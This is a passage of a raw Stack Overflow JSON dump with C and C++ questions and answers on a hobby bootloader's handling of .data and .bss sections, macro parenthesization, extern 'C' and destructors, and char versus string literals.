value.</p>\n\n<pre><code>uint8_t x = 80 / 2;\nuint8_t y = 25 / 2;\nvoid print() {\n    // print hello world;\n}\n</code></pre>\n\n<p>My program begins triple faulting. Why can't I define .ds data? I used <em>objdump</em> and <em>hexdump</em> to check what happened to the executable. I found the hexdump can display the x, y value in the binary, and the offset matches the read instruction. So I doubt if my bootloader has bugs?</p>\n\n<p>Yes, my boot loader did have a bug. It only read 1 sector on the CD, so the values were left uncopied. CDs have a sector size of 2k, but the BIOS only read 512 bytes for the first sector. What's more, if I let x = 0, y = 0, and put them as static value outside, do you think what will happen? OMG, triple fault again!</p>\n\n<p>The x, y will turn from .ds to .bss, and won't be included in elf and binary. (elf only has the size, but no initialization value, because the default value is 0).</p>\n\n<p>To generate a workable binary, you need specify the option like this:</p>\n\n<pre><code>objcopy -O binary --set-section-flags .bss=alloc,load,contents startup.elf startup.bin\n</code></pre>\n"}], "owner": {"reputation": 71, "user_id": 5602950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58a288bf71b3d964ef493468868a3c38?s=128&d=identicon&r=PG&f=1", "display_name": "ffcactus", "link": "https://stackoverflow.com/users/5602950/ffcactus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 199, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1454110471, "creation_date": 1449672638, "last_edit_date": 1449727669, "question_id": 34181799, "link": "https://stackoverflow.com/questions/34181799/how-bootloader-find-the-ds-section-in-binary-file", "title": "How bootloader find the DS section in binary file", "body": "<p>I'm study the kernel development.\nI have a bootloader and can load my binary file to the memory and run it. The binary file is generated from C language, the build process like this:</p>\n\n<pre><code>i686-elf-gcc -c main.c -o main.o -std=gnu99 -ffreestanding -Wall -Wextra\ni686-elf-gcc -m32 -Ttext 0x8000 -o startup.elf -ffreestanding -O2 -nostdlib main.o -lgcc\nobjcopy -O binary startup.elf startup.bin\n</code></pre>\n\n<p>The i686-elf-gcc is my GCC cross compiler.\nSince my bootloader is a little big, and I think it has no relationship between the problem, I'm not going to show it here. My bootloader will prepare a the protect mode, enable A20, and setup 4GB code/data descriptor table for the C binary file. And the C binary file works fine. I let it clean the screen, and print \"Hello World!\", it works. \nThe problem is that if my main.c contains initialized data section, it doesn't work well. For example, if I set the default (X, Y) coordination to (10, 10), the \"Hello World\" still show at the most top left. The problem is when I convert the elf file to binary, the binary executive can use the information(10, 10).</p>\n\n<p>When I use hexdump to check the binary file, I can find the data value. For example if I have</p>\n\n<pre><code>uint16_t ds = 0x1234;\n</code></pre>\n\n<p>I can see the 0x1234 in the binary file, it looks like it doesn't locate at the code section but at another section. (For example code section start at 0x0000, but 0x1234 located far at 0x2000)\nAnd I also found that the \"main\" function expect the data section to be saved in the stack, so that it can refer to.\nSo my bootloader need get the data section from the binary file, and push it to the stack. But how can I find location and size of the data section in the binary file? If my solution is wrong, then how to let the bootloader load a executable which contains data section?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1449672469, "post_id": 34181643, "comment_id": 56109577, "body": "What error are you getting for the first one?"}, {"owner": {"reputation": 4756, "user_id": 1364149, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/Y25ip.jpg?s=128&g=1", "display_name": "Shloim", "link": "https://stackoverflow.com/users/1364149/shloim"}, "edited": false, "score": 4, "creation_date": 1449672575, "post_id": 34181643, "comment_id": 56109686, "body": "Please add the code that actually uses this macro"}, {"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 1, "creation_date": 1449672705, "post_id": 34181643, "comment_id": 56109788, "body": "<code>#define</code>statements are literal text replacements used as syntactic sugar, we can&#39;t determine why this is happening without the code using this."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1449672742, "post_id": 34181643, "comment_id": 56109812, "body": "It is much safer to enclose macro constants such as these in parentheses, as in your variation (2), for otherwise you can run into problems with operator precedence.  Remember always that macros are not variables."}, {"owner": {"reputation": 25589, "user_id": 15727, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FFivc.jpg?s=128&g=1", "display_name": "Thomas Padron-McCarthy", "link": "https://stackoverflow.com/users/15727/thomas-padron-mccarthy"}, "edited": false, "score": 0, "creation_date": 1449673166, "post_id": 34181643, "comment_id": 56110142, "body": "You really need to create a minimal but complete and compilable example that still shows the problem."}, {"owner": {"reputation": 49, "user_id": 5195104, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/5e50f56062f7ae674bb36946b8ba18ab?s=128&d=identicon&r=PG&f=1", "display_name": "Mlo Bootloader", "link": "https://stackoverflow.com/users/5195104/mlo-bootloader"}, "edited": false, "score": 0, "creation_date": 1449673395, "post_id": 34181643, "comment_id": 56110292, "body": "I can put lines where it is used exactly. This #define is not used in more than one file."}], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 5195104, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/5e50f56062f7ae674bb36946b8ba18ab?s=128&d=identicon&r=PG&f=1", "display_name": "Mlo Bootloader", "link": "https://stackoverflow.com/users/5195104/mlo-bootloader"}, "edited": false, "score": 0, "creation_date": 1449672834, "post_id": 34181797, "comment_id": 56109884, "body": "This kind of code is not used in more than two files. I checked if such problem is there, but everywhere the #define is covered in parantheses, without any multiplication you have shown."}, {"owner": {"reputation": 49, "user_id": 5195104, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/5e50f56062f7ae674bb36946b8ba18ab?s=128&d=identicon&r=PG&f=1", "display_name": "Mlo Bootloader", "link": "https://stackoverflow.com/users/5195104/mlo-bootloader"}, "edited": false, "score": 0, "creation_date": 1449673453, "post_id": 34181797, "comment_id": 56110335, "body": "I compiled and checked binaries time of build before flashing."}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449673724, "post_id": 34181797, "comment_id": 56110524, "body": "Nitpick: it&#39;ll actually print 15 ;)"}], "tags": [], "owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "is_accepted": false, "score": 5, "last_activity_date": 1449681051, "last_edit_date": 1449681051, "creation_date": 1449672635, "answer_id": 34181797, "question_id": 34181643, "link": "https://stackoverflow.com/questions/34181643/i-am-getting-results-different-while-using-defines/34181797#34181797", "title": "I am getting results different while using #defines", "body": "<p>This is a bit of a blind shot since you didn't provide the code that uses the <code>#define</code>, but you are violating one of the fundamental best practices about constants in <code>#define</code>s.</p>\n\n<p>Since <code>#define</code>s are applied as a blind text replacement, if you don't surround calculations with parentheses you are potentially making a mess of the expressions of code that uses your define. Consider</p>\n\n<pre><code>#define SEVEN 5+2\n</code></pre>\n\n<p>and then someone using it as</p>\n\n<pre><code>printf(\"thirty-five: %d\", SEVEN*5);\n</code></pre>\n\n<p>This will actually print 15, as it will be replaced as:</p>\n\n<pre><code>printf(\"thirty-five: %d\", 5+2*5);\n</code></pre>\n\n<p>So, to avoid problems always surround your constant defines with parentheses. Why the last one seems to work is behind me, maybe you didn't actually recompile with it?</p>\n"}, {"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449677723, "post_id": 34182328, "comment_id": 56113488, "body": "I had to delete my earlier comment under the other answer, which said &quot;but OP&#39;s code failed <i>with</i> parentheses&quot;, because the question is poorly worded and I think there is a full-stop missing on his third line. But I agree with you, how can his last example work if the first doesn&#39;t?"}, {"owner": {"reputation": 49, "user_id": 5195104, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/5e50f56062f7ae674bb36946b8ba18ab?s=128&d=identicon&r=PG&f=1", "display_name": "Mlo Bootloader", "link": "https://stackoverflow.com/users/5195104/mlo-bootloader"}, "edited": false, "score": 0, "creation_date": 1449678289, "post_id": 34182328, "comment_id": 56113887, "body": "I will talk to my lead. Show him the code and ask for clarification. I will also put a simpler version of code that I am using. It is a big project, and giving context is not that easy but I can make sure that the code piece I have written is fully correct with my comments wherever I made."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 2, "last_activity_date": 1449679735, "last_edit_date": 1449679735, "creation_date": 1449674107, "answer_id": 34182328, "question_id": 34181643, "link": "https://stackoverflow.com/questions/34181643/i-am-getting-results-different-while-using-defines/34182328#34182328", "title": "I am getting results different while using #defines", "body": "<p>I do not believe your claim that variation (2) produces the behavior you expect but (1) and (3) produce different behavior than each other. Furthermore, if indeed you were using the macro as you describe:</p>\n\n<pre><code>*(OSLongType *)(SRAM1)= 0;\n</code></pre>\n\n<p>then you would not see any difference in behavior between (1) and (2).</p>\n\n<p>I'm inclined to suppose that what you actually had a problem with was instead along the lines of</p>\n\n<pre><code>*(OSLongType *)SRAM1= 0;\n</code></pre>\n\n<p>That has different meaning with your variations (1) and (3) than with your variation (2).  With variation (1), for example, it expands to</p>\n\n<pre><code>*(OSLongType *)0xb0000000+((1024*1024)-64)= 0;\n</code></pre>\n\n<p>.  The cast and indirection operators have higher precedence than does <code>+</code>, so that's equivalent to</p>\n\n<pre><code>(*((OSLongType *)0xb0000000)) + ((1024*1024) - 64) = 0;\n</code></pre>\n\n<p>.  That won't compile because the left-hand side of the assignment is not an lvalue.  Variation (3) does not solve this problem.</p>\n\n<p>With variation (2), however, the expression expands instead to ...</p>\n\n<pre><code>*(OSLongType *)(0xb0000000+((1024*1024)-64))= 0;\n</code></pre>\n\n<p>... which is perfectly valid.  The address is computed as an integer, then converted to a pointer, then dereferenced.  The result of the conversion is implementation defined, but the code should at least compile, and it may do what you want.</p>\n\n<p>The only possible difference between variations (1) and (3) is the data types chosen for the integer constants.  The constant <code>1024</code> definitely has type <code>int</code>, and the expression <code>1024*1024</code> therefore also has type <code>int</code>.  If your system's <code>int</code>s are only 16 bits wide, however, then the arithmetic product of 1024 and 1024 does not fit in a 16-bit integer.  In that case, the resulting value of that expression is implementation-defined, and definitely not 1048576.  In that case, however, the constant <code>1048676</code> represents a valid value of type <code>long int</code>, making (3) different from (1).</p>\n\n<p><strong>Updated to add:</strong></p>\n\n<p>I would recommend consistently using this form:</p>\n\n<pre><code>#define SRAM1     (0xb0000000+(((uintptr_t)1024*1024)-64))\n</code></pre>\n\n<p>Type <code>uintptr_t</code> is defined in <code>stdint.h</code>, which you will therefore need to include if you do not do so already.  You could throw in some more casts to <code>uintptr_t</code> if you are comforted by such consistency, but they are not necessary.</p>\n"}], "owner": {"reputation": 49, "user_id": 5195104, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/5e50f56062f7ae674bb36946b8ba18ab?s=128&d=identicon&r=PG&f=1", "display_name": "Mlo Bootloader", "link": "https://stackoverflow.com/users/5195104/mlo-bootloader"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 62, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1449681051, "creation_date": 1449672277, "last_edit_date": 1449672739, "question_id": 34181643, "link": "https://stackoverflow.com/questions/34181643/i-am-getting-results-different-while-using-defines", "title": "I am getting results different while using #defines", "body": "<p>I am working in a project where we have lots of memory as #defines\nsuch as </p>\n\n<pre><code>#define SRAM1      0xb0000000+((1024*1024)-64)   //1\n</code></pre>\n\n<p>I was getting an error if I use above #define\nIf I change this to</p>\n\n<pre><code>#define SRAM1     (0xb0000000+((1024*1024)-64))  //2\n</code></pre>\n\n<p>It works.\nEven this works</p>\n\n<pre><code>#define SRAM1      0xb0000000+((1048576)-64)     //3\n</code></pre>\n\n<p>Is it a problem with associativity or multiplication in pointer is not allowed in this way?\nP.S\nusage in our work is </p>\n\n<pre><code>         if((*(OSLongType *)(SRAM1)) == 1)\n</code></pre>\n\n<p>or</p>\n\n<pre><code>         *(OSLongType *)(SRAM1)= 0;\n</code></pre>\n\n<p>in this way.</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 4, "creation_date": 1449672337, "post_id": 34181603, "comment_id": 56109460, "body": "Your comment is incorrect."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449775885, "post_id": 34181603, "comment_id": 56164430, "body": "this is C++ code, not C code.  Please remove the &#39;c&#39; tag"}], "answers": [{"tags": [], "owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "is_accepted": false, "score": 2, "last_activity_date": 1449672306, "last_edit_date": 1495535241, "creation_date": 1449672306, "answer_id": 34181657, "question_id": 34181603, "link": "https://stackoverflow.com/questions/34181603/is-c-class-destructor-called-when-i-create-object-inside-extern-c/34181657#34181657", "title": "Is c++ class destructor called when I create object inside extern c", "body": "<p>The language linkage of the function <em>name</em> has no effect on the semantics of the function. It only affects how the name is seen within the program.</p>\n\n<p>Your function behaves as expected. (Though <a href=\"https://stackoverflow.com/q/1424510\">your expectations may differ</a> from what you wrote.)</p>\n"}, {"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": true, "score": 3, "last_activity_date": 1449673818, "last_edit_date": 1449673818, "creation_date": 1449672346, "answer_id": 34181676, "question_id": 34181603, "link": "https://stackoverflow.com/questions/34181603/is-c-class-destructor-called-when-i-create-object-inside-extern-c/34181676#34181676", "title": "Is c++ class destructor called when I create object inside extern c", "body": "<p><code>extern \"C\"</code> is a <em>link-time</em> directive. It does not change how the language itself works.</p>\n\n<p>No destructor is called in your case since <code>A a();</code> is declaring a function prototype for a function that takes no arguments and returns an <code>A</code>. It does <strong>not</strong> create an instance of <code>A</code>. (See <em>most vexing parse</em>).</p>\n\n<p>If you had written <code>A a;</code> instead, then the default constructor would have been called, along with the destructor once <code>a</code> goes out of scope.</p>\n"}, {"tags": [], "owner": {"reputation": 140851, "user_id": 1120273, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/4cbcb185abce0204cf5ac705ba32d53a?s=128&d=identicon&r=PG", "display_name": "Dietmar K&#252;hl", "link": "https://stackoverflow.com/users/1120273/dietmar-k%c3%bchl"}, "is_accepted": false, "score": 2, "last_activity_date": 1449672358, "creation_date": 1449672358, "answer_id": 34181678, "question_id": 34181603, "link": "https://stackoverflow.com/questions/34181603/is-c-class-destructor-called-when-i-create-object-inside-extern-c/34181678#34181678", "title": "Is c++ class destructor called when I create object inside extern c", "body": "<p>The <code>extern \"C\"</code> qualification just affects how the function can be called and imposes some constraints on the function signature. It doesn't affect its implementation. That is, if there were an object inside your function, it would be both constructed and destroyed.</p>\n\n<p>Of course, in the code in the question there is actually no object created as <code>A a();</code> is a function declaration. If you want to actually create an object and invoke its default constructor, you'd use, e.g., one of the definitions below:</p>\n\n<pre><code>A a1 = A();\nA a2{};\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 64049, "user_id": 2015579, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/28571d6df35321850e78b1ebfd48e5b4?s=128&d=identicon&r=PG", "display_name": "Richard Hodges", "link": "https://stackoverflow.com/users/2015579/richard-hodges"}, "is_accepted": false, "score": 2, "last_activity_date": 1449672618, "creation_date": 1449672618, "answer_id": 34181786, "question_id": 34181603, "link": "https://stackoverflow.com/questions/34181603/is-c-class-destructor-called-when-i-create-object-inside-extern-c/34181786#34181786", "title": "Is c++ class destructor called when I create object inside extern c", "body": "<p>such questions can be answered at home by building a tiny test program:</p>\n\n<pre><code>#include &lt;iostream&gt;\n\nstruct A\n{\n    ~A() { std::cout &lt;&lt; __func__ &lt;&lt; std::endl; }\n};\n\nextern \"C\" {\n    int func()\n    {\n        A a; // a is object of class A\n        return 0;\n    }\n}\n\nint main()\n{\n    func();\n    return 0;\n}\n</code></pre>\n\n<p>expected output:</p>\n\n<pre><code>~A\n</code></pre>\n\n<p>Answer: yes</p>\n"}], "owner": {"reputation": 21, "user_id": 5655450, "user_type": "registered", "profile_image": "https://graph.facebook.com/1059782417405464/picture?type=large", "display_name": "\u0412\u0456\u0442\u0430\u043b\u0456\u0439 \u0414\u0443\u0442\u043a\u0430", "link": "https://stackoverflow.com/users/5655450/%d0%92%d1%96%d1%82%d0%b0%d0%bb%d1%96%d0%b9-%d0%94%d1%83%d1%82%d0%ba%d0%b0"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 337, "favorite_count": 0, "accepted_answer_id": 34181676, "answer_count": 4, "score": 1, "last_activity_date": 1449673818, "creation_date": 1449672140, "last_edit_date": 1449672510, "question_id": 34181603, "link": "https://stackoverflow.com/questions/34181603/is-c-class-destructor-called-when-i-create-object-inside-extern-c", "title": "Is c++ class destructor called when I create object inside extern c", "body": "<p>Is destructor called in such piece of code when a is destroyed?</p>\n\n<pre><code>extern \"C\" {\n    int func()\n    {\n        A a(); // a is object of class A\n    }\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "edited": false, "score": 0, "creation_date": 1449671729, "post_id": 34181391, "comment_id": 56108971, "body": "<code>const char* c = &quot;@@@@@@@&quot;;</code>"}, {"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 0, "creation_date": 1449672169, "post_id": 34181391, "comment_id": 56109340, "body": "A <code>char</code> can represent <i>one</i> character, like <code>&#39;@&#39;</code> or <code>&#39;a&#39;</code>. All your &quot;characters&quot; consist of several characters. You&#39;ll get better help if you explain what you&#39;re going to do with them."}], "answers": [{"comments": [{"owner": {"reputation": 55, "user_id": 5560864, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc64f9baaa65ed71806b8773173201fd?s=128&d=identicon&r=PG&f=1", "display_name": "Aamir John", "link": "https://stackoverflow.com/users/5560864/aamir-john"}, "edited": false, "score": 0, "creation_date": 1449672042, "post_id": 34181415, "comment_id": 56109233, "body": "no no I am using these variables in an if statement and I change the value according to the if."}, {"owner": {"reputation": 11225, "user_id": 241013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0825ba5ec12464a2b8176642830e6a7?s=128&d=identicon&r=PG", "display_name": "Sorin", "link": "https://stackoverflow.com/users/241013/sorin"}, "reply_to_user": {"reputation": 55, "user_id": 5560864, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc64f9baaa65ed71806b8773173201fd?s=128&d=identicon&r=PG&f=1", "display_name": "Aamir John", "link": "https://stackoverflow.com/users/5560864/aamir-john"}, "edited": false, "score": 0, "creation_date": 1449672263, "post_id": 34181415, "comment_id": 56109405, "body": "You can copy char arrays. I use const because the pointers will point to compiler static constants in the case above. Allocate a modifiable array <code>char * symbol = (char*)malloc(max_length_of_your_string+1);</code> then use memcpy to copy whatever you want there. C strings are kinda horrible and easy to mess up. If you can use C++ strings it will make your life a lot easier."}], "tags": [], "owner": {"reputation": 11225, "user_id": 241013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c0825ba5ec12464a2b8176642830e6a7?s=128&d=identicon&r=PG", "display_name": "Sorin", "link": "https://stackoverflow.com/users/241013/sorin"}, "is_accepted": false, "score": 4, "last_activity_date": 1449671988, "last_edit_date": 1449671988, "creation_date": 1449671654, "answer_id": 34181415, "question_id": 34181391, "link": "https://stackoverflow.com/questions/34181391/how-to-assign-special-characters-to-a-variable-in-c/34181415#34181415", "title": "How to assign special characters to a variable in C?", "body": "<p>It works, but you are trying to put multiple character into a single one which doesn't make sense.</p>\n\n<p>Try:</p>\n\n<pre><code>char symbol = '@';\nconst char symbols[] = \"@@@@@@\";\nconst char* symbols2 = \"@@@@@@@\";\n</code></pre>\n\n<p>Note that you need to use single quotes <code>'</code> for single characters and double quotes <code>\"</code> for strings.</p>\n\n<p>Also note that char is usually defined as 8-bit integer so you can only hold the usual ASCII characters. If you need Unicode you should use char arrays to accommodate all the bits needed and preferably use a library that  takes care of handling, conversions, and any other operation you might want to do.</p>\n"}, {"tags": [], "owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "is_accepted": false, "score": 1, "last_activity_date": 1449671733, "creation_date": 1449671733, "answer_id": 34181454, "question_id": 34181391, "link": "https://stackoverflow.com/questions/34181391/how-to-assign-special-characters-to-a-variable-in-c/34181454#34181454", "title": "How to assign special characters to a variable in C?", "body": "<p>You should use a <em>pointer to char</em> if you want to assign multiple values. </p>\n\n<pre><code>const char *smth = \"@@@@\";\n</code></pre>\n\n<p>If you need only one, then simply <code>char smth = '@';</code></p>\n"}], "owner": {"reputation": 55, "user_id": 5560864, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc64f9baaa65ed71806b8773173201fd?s=128&d=identicon&r=PG&f=1", "display_name": "Aamir John", "link": "https://stackoverflow.com/users/5560864/aamir-john"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3084, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1449671988, "creation_date": 1449671597, "question_id": 34181391, "link": "https://stackoverflow.com/questions/34181391/how-to-assign-special-characters-to-a-variable-in-c", "title": "How to assign special characters to a variable in C?", "body": "<p>How to assign a special character to a variable in C?\nI am trying to assign variable symbol a character like ~~~~~ or @@@@@ or ***** or ;;;;;;.\nWhat I did was<code>char symbol = \"~~~~~~~~~~\";</code>\nbut this did not work, so I tried to change double quotes to single like this:</p>\n\n<pre><code>char symbol = '@@@@@@@@@';\n</code></pre>\n\n<p>but this did not work either;</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 2, "creation_date": 1449672291, "post_id": 34181374, "comment_id": 56109428, "body": "Again with the crazy byte-counting.  Are you running on some RAM-restricted embedded system?"}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "reply_to_user": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449672787, "post_id": 34181374, "comment_id": 56109850, "body": "@ch3rub7 Changed the lengths to 30 but again there are some issues."}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449672899, "post_id": 34181374, "comment_id": 56109933, "body": "hmm... it&#39;s better if you include errors in your question.. like desired output and the actual output you are getting"}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "reply_to_user": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449673065, "post_id": 34181374, "comment_id": 56110075, "body": "@ch3rub7 After testing the code, the main problem is when i want to merge a_b[] and c_d[] to e[]."}, {"owner": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449674095, "post_id": 34181374, "comment_id": 56110790, "body": "you want to print <code>unique element = 6, at index = 16</code> right? @Aldi"}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "reply_to_user": {"reputation": 4232, "user_id": 5281962, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a29ae5ecb74bea23afa60d940edc0282?s=128&d=identicon&r=PG&f=1", "display_name": "Cherubim", "link": "https://stackoverflow.com/users/5281962/cherubim"}, "edited": false, "score": 0, "creation_date": 1449674673, "post_id": 34181374, "comment_id": 56111221, "body": "@ch3rub7 I want to print 5 and 6. The method works only if there is only 1 unique number."}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "edited": false, "score": 0, "creation_date": 1449677964, "post_id": 34181374, "comment_id": 56113645, "body": "@Aldi - the title should be changed to merge 4 already sorted arrays, then print unique numbers from the merged array."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "reply_to_user": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "edited": false, "score": 0, "creation_date": 1449680151, "post_id": 34181374, "comment_id": 56115276, "body": "@rcgldr It was just coincidence that the numbers were sorted."}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "edited": false, "score": 0, "creation_date": 1449681269, "post_id": 34181374, "comment_id": 56116027, "body": "@Aldi - &quot;merge 4 arrays&quot; implies that the arrays are already sorted. So the problem could be &quot;concatenate 4 unsorted arrays, and sort the concatenated array&quot;, or &quot;sort 4 unsorted arrays, then merge them to form a sorted array&quot; ."}, {"owner": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", 